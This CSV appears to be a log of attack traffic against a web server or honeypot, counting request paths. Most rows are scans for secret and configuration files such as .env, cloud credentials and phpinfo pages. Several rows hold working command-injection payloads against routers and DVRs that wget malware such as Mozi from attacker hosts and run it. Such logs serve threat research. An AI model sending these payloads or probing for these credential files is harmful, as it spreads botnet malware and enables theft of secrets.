url,count
POST /cgi-bin/check_auth.json HTTP/1.1,1
GET /db.yaml HTTP/1.1,1
GET /db.config HTTP/1.1,1
GET /dbconfig.php HTTP/1.1,1
GET /database.php HTTP/1.1,1
GET /application/config/database.php HTTP/1.1,1
GET /fuel/application/config/database.php HTTP/1.1,1
GET /shell?cd+/tmp;rm+njvwa4+ivwebcda7;wget+http:/\/fbi.eye-network.ru/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;rm+-rf+ivwebcda7;wget+http:/\/fbi.eye-network.ru/vevhea4;chmod+777+vevhea4;./vevhea4+jaws;rm+-rf+vevhea4 HTTP/1.1,1
GET /app/config/database.php HTTP/1.1,1
GET /protected/config/database.php HTTP/1.1,1
GET /administrator/configuration.php HTTP/1.1,1
GET /api/swagger.json HTTP/1.1,1
GET /api/swagger.yaml HTTP/1.1,1
GET /development.config.js HTTP/1.1,1
GET /nuxt.config.js HTTP/1.1,1
GET /config.dev.js HTTP/1.1,1
GET /next.config.js HTTP/1.1,1
GET /s3cmd.ini HTTP/1.1,1
GET /shell?cd%20/tmp%20||%20cd%20/run%20||%20cd%20/;%20wget%20http://216.9.227.143/Ciabins.sh;%20chmod%20777%20Ciabins.sh;%20sh%20Ciabins.sh;%20tftp%20216.9.227.143%20-c%20get%20Ciatftp1.sh;%20chmod%20777%20Ciatftp1.sh;%20sh%20Ciatftp1.sh;%20tftp%20-r%20Ciatftp2.sh%20-g%20216.9.227.143;%20chmod%20777%20Ciatftp2.sh;%20sh%20Ciatftp2.sh;%20rm%20-rf%20Ciabins.sh%20Ciatftp1.sh%20Ciatftp2.sh;%20rm%20-rf%20* HTTP/1.1,1
GET /gcloud/configuration.yaml HTTP/1.1,1
GET /.azure/config HTTP/1.1,1
GET /.azure/credentials HTTP/1.1,1
GET /kubernetes/config HTTP/1.1,1
GET /kube/config HTTP/1.1,1
GET /.kube/config HTTP/1.1,1
GET /.env.aws HTTP/1.1,1
GET /.env.cloud HTTP/1.1,1
GET /.env.dev.js HTTP/1.1,1
GET /.env.prod.js HTTP/1.1,1
GET /.env.staging.js HTTP/1.1,1
GET /Odin/http/call1735581062 HTTP/1.1,1
GET /OdinHttpCall1735581062 HTTP/1.1,1
POST /yoKL3 HTTP/1.1,1
POST /r2K4X HTTP/1.1,1
POST /cgi-bin/login_setup.cgi HTTP/1.1,1
GET /web HTTP/1.1,1
GET /admin/config.php HTTP/1.0,1
GET /env; HTTP/1.1,1
GET /actuator;/env; HTTP/1.1,1
GET /api;/actuator;/env; HTTP/1.1,1
GET /api;/env; HTTP/1.1,1
GET /admin;/env; HTTP/1.1,1
GET /admin;/actuator;/env; HTTP/1.1,1
GET /gateway;/env; HTTP/1.1,1
GET /gateway;/actuator;/env; HTTP/1.1,1
GET /gate;/actuator;/env; HTTP/1.1,1
GET /gate;/env; HTTP/1.1,1
GET /ews HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.210.101.103:37092/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /tr/ HTTP/1.1,1
GET /_poopinfo.php HTTP/1.1,1
GET /cmd.cgi HTTP/1.1,1
GET /raephaeyeip4fawe HTTP/1.1,1
GET /?phpinfo=-1 HTTP/1.1,1
GET /owa HTTP/1.1,1
POST /live_env%20 HTTP/1.1,1
GET /.env.project%20 HTTP/1.1,1
POST /.env.project%20 HTTP/1.1,1
GET /shared/.env%20 HTTP/1.1,1
POST /shared/.env%20 HTTP/1.1,1
GET /debug/default/view?panel=config/frontend_dev.php HTTP/1.1,1
GET /debug/default/view.html HTTP/1.1,1
GET /frontend/web/debug/default/view HTTP/1.1,1
GET /web/debug/default/view HTTP/1.1,1
GET /sapi/debug/default/view HTTP/1.1,1
GET /AwsConfig.json HTTP/1.1,1
GET /parameters.yml HTTP/1.1,1
GET /app_dev.php/_profiler/phpinfo HTTP/1.1,1
GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php HTTP/1.1,1
GET /tool/view/phpinfo.view.php HTTP/1.1,1
GET /html/phpinfo.php HTTP/1.1,1
GET /__info.php HTTP/1.1,1
POST /cgi-bin/cgi_login.cgi HTTP/1.1,1
GET /odinhttpcall1731806352 HTTP/1.1,1
GET /Odin/http/call1731806352 HTTP/1.1,1
GET /env/.env HTTP/1.1,1
GET /new/.env.local HTTP/1.1,1
GET /new/.env.staging HTTP/1.1,1
GET /wp-config HTTP/1.1,1
GET /awstats/.env HTTP/1.1,1
GET /cron/.env HTTP/1.1,1
GET /docker/app/.env HTTP/1.1,1
GET /env.backup HTTP/1.1,1
GET /xampp/phpinfo.php HTTP/1.1,1
GET /lara/info.php HTTP/1.1,1
GET /lara/phpinfo.php HTTP/1.1,1
GET /config/000000000000.cfg HTTP/1.1,1
GET /ipeconfig/000000000000.cfg HTTP/1.1,1
GET /prov/000000000000.cfg HTTP/1.1,1
GET /OdinHttpCall1731806352 HTTP/1.1,1
GET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1,1
GET /_info-backoffice.php HTTP/1.1,1
GET /provisioning/000000000000.cfg HTTP/1.1,1
GET /_info.php HTTP/1.1,1
GET /_phpinf.php HTTP/1.1,1
GET /.__info.php HTTP/1.1,1
GET /api/index.php/v1/config/application?public=true HTTP/1.1,1
GET /.info.php HTTP/1.1,1
GET /0.0_phpinfo.php HTTP/1.1,1
GET /00_server_info.php HTTP/1.1,1
GET /02-info.php HTTP/1.1,1
GET /1_1_PhpInfo.php HTTP/1.1,1
GET /5info.php HTTP/1.1,1
GET /db.yml HTTP/1.1,1
GET /new/.env.production HTTP/1.1,1
GET /db.php HTTP/1.1,1
GET /.vscode/.env HTTP/1.1,1
GET /provision/000000000000.cfg HTTP/1.1,1
GET /live_env%20 HTTP/1.1,1
POST /redmine/.env HTTP/1.1,1
POST /apps/.env%20 HTTP/1.1,1
POST /phpgroupware/xmlrpc.php HTTP/1.1,1
POST /%2577eb%2575i_%2577sma_Http HTTP/1.1,1
POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1,1
GET /odinhttpcall1734692536 HTTP/1.1,1
POST /blog/xmlsrv/xmlrpc.php HTTP/1.1,1
GET /OdinHttpCall1734692536 HTTP/1.1,1
GET /Odin/http/call1734692536 HTTP/1.1,1
GET /geju.php HTTP/1.1,1
POST /blog/xmlrpc.php HTTP/1.1,1
GET /cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20209%2e136%2e48%2e69%2fmirela%3bchmod%20%2bx%20mirela%3b%2e%2fmirela;echo%20YYY;echo|%20 HTTP/1.1,1
GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20209%2e136%2e48%2e69%2fmirela%3bchmod%20%2bx%20mirela%3b%2e%2fmirela;echo%20YYY;echo|%20 HTTP/1.1,1
POST /xmlsrv/xmlrpc.php HTTP/1.1,1
GET /IZjO HTTP/1.1,1
POST /api/gql HTTP/1.1,1
GET /jquery-3.3.1.min.js HTTP/1.1,1
POST /AJxnF HTTP/1.1,1
POST /drupal/xmlrpc.php HTTP/1.1,1
GET /cgi-bin/ExportSettings.sh HTTP/1.1,1
GET /apps/.env%20 HTTP/1.1,1
POST /wordpress/xmlrpc.php HTTP/1.1,1
GET /api/v1/env HTTP/1.1,1
GET /api/v1/actuator/env HTTP/1.1,1
GET /api/v2/env HTTP/1.1,1
GET /api/v2/actuator/env HTTP/1.1,1
GET /v1/env HTTP/1.1,1
GET /v1/actuator/env HTTP/1.1,1
GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+/tmp;wget+http://banthis.su/darm7;chmod+777+darm7;./darm7+dvr HTTP/1.1,1
CONNECT example.com:443 HTTP/1.1,1
GET /Odin/http/call1735327901 HTTP/1.1,1
GET /manager/env HTTP/1.1,1
GET /wp-includes/style.php HTTP/1.1,1
POST /sId25 HTTP/1.1,1
POST /development/.env%20 HTTP/1.1,1
GET /wp-content/plugins/WordPressCore/include.php HTTP/1.1,1
POST /xmlrpc/xmlrpc.php HTTP/1.1,1
POST /3RDoc HTTP/1.1,1
POST /lrgJc HTTP/1.1,1
POST /wId8V HTTP/1.1,1
POST /89icQ HTTP/1.1,1
GET /deployment-config.json HTTP/1.1,1
GET /db/robomongo.json HTTP/1.1,1
GET /robomongo.json HTTP/1.1,1
GET /client_secrets.json HTTP/1.1,1
GET /user-config.json HTTP/1.1,1
GET /ssh-config.json HTTP/1.1,1
GET /database-config.json HTTP/1.1,1
GET /config/default.json HTTP/1.1,1
GET /credentials/config.json HTTP/1.1,1
GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1,1
GET /_profiler/open?file=app/config/parameters.yml HTTP/1.1,1
GET /env.json HTTP/1.1,1
GET /aws.json HTTP/1.1,1
GET /odinhttpcall1733955913 HTTP/1.1,1
GET /awsconfig.json HTTP/1.1,1
GET /_wpeprivate/config.json HTTP/1.1,1
GET /ws-config.json HTTP/1.1,1
GET /sendgrid.json HTTP/1.1,1
GET /.svn/ HTTP/1.1,1
GET //admin/config.php HTTP/1.1,1
GET //libs/js/iframe.js HTTP/1.1,1
GET /C:/Program%20Files/Git/.env HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://49.64.137.38:48197/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F37.44.238.94%2Fl+-O-%7C+sh%60) HTTP/1.1,1
GET /tmui/login.jsp HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.188.82.218%2Ft+-O-%7C+sh%60) HTTP/1.1,1
GET /smtp.json HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.228.194.61:52714/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /agc/calendar_db.js HTTP/1.1,1
POST /o3Zia HTTP/1.1,1
GET /Odin/http/call1733955913 HTTP/1.1,1
GET /OdinHttpCall1733955913 HTTP/1.1,1
GET /conf.json HTTP/1.1,1
GET /shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\/185.142.53.43/c/j;chmod+777+j;./j HTTP/1.1,1
